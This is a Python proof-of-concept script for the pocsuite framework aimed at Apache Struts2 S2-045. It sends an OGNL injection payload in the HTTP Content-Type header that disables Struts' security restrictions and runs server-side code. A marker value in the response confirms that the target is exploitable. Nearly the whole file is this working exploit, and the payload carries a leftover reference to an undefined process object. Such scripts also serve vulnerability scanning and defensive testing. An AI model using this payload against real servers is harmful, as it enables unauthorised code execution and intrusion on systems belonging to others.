#!/usr/bin/env python
# coding: utf-8
# import os
import random
from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


class TestPOC(POCBase):
    vulID = '0'
    version = '0'
    author = ['None']
    vulDate = 'None'
    createDate = 'None'
    updateDate = 'None'
    references = ['None']
    name = 'Struts2 方法调用远程代码执行漏洞(S2-045)'
    appPowerLink = 'http://struts.apache.org/'
    appName = 'Apache Struts'
    appVersion = ''
    vulType = 'Code Execution'
    desc = '''
    '''
    samples = ['']
    install_requires = ['']

    def _attack(self):
        return self._verify()

    def _verify(self):
        try:
            result = {}

            header = dict()
            header["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
            header["Content-Type"] = "%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println(100*100*112)).(#outstr.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
            r = req.get(self.url, headers=header, timeout=10)
            if "1120000" in r.content:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
            # Write your code here
        except Exception:
            pass

        return self.parse_output(result)

    def parse_output(self, result):
        # parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
